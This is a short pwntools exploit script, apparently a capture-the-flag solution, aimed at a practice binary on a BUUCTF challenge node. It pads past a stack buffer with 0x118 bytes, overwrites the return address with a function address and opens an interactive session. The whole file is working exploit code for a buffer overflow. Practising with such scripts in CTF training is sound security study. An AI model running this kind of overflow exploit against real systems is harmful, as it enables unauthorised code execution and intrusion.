from pwn import *
context(os="linux",arch="amd64",log_level="debug")
p=process("./pwn")
#p=remote("node5.buuoj.cn",29664)
elf=ELF("pwn")

def debug():
	gdb.attach(p)
	pause()

vuln_addr=0x401157
pop_rdi=0x401263
payload=b"a"*0x118+p64(vuln_addr)
p.sendline(payload)
#debug()
p.interactive()
